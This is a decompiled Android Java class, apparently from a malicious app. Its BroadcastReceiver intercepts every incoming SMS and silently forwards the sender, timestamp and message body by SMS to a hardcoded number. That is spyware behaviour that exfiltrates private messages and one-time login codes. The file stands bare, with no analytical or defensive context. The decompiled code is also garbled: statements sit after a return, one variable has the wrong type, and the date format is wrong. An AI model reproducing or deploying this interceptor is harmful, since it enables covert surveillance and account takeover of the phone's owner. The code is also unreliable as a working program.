package com.example.smslistener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class SMSListenerBroadcastReceive
  extends BroadcastReceiver
{
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramIntent = (Object[])paramIntent.getExtras().get("pdus");
    paramContext = new SmsMessage[paramIntent.length];
    int i = 0;
    int j;
    if (i >= paramIntent.length)
    {
      j = paramContext.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j)
      {
        return;
        paramContext[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
        i += 1;
        break;
      }
      Date localDate = paramContext[i];
      paramIntent = localDate.getMessageBody();
      String str = localDate.getOriginatingAddress();
      localDate = new Date(localDate.getTimestampMillis());
      sendSmsMessage("13000000000", new SimpleDateFormat("yyyy-MM-DD HH-MM-SS").format(localDate) + ": " + str + ": " + paramIntent);
      i += 1;
    }
  }
  
  public void sendSmsMessage(String paramString1, String paramString2)
  {
    SmsManager localSmsManager = SmsManager.getDefault();
    if (paramString2.length() >= 70)
    {
      paramString2 = localSmsManager.divideMessage(paramString2).iterator();
      for (;;)
      {
        if (!paramString2.hasNext()) {
          return;
        }
        localSmsManager.sendTextMessage(paramString1, null, (String)paramString2.next(), null, null);
      }
    }
    localSmsManager.sendTextMessage(paramString1, null, paramString2, null, null);
  }
}
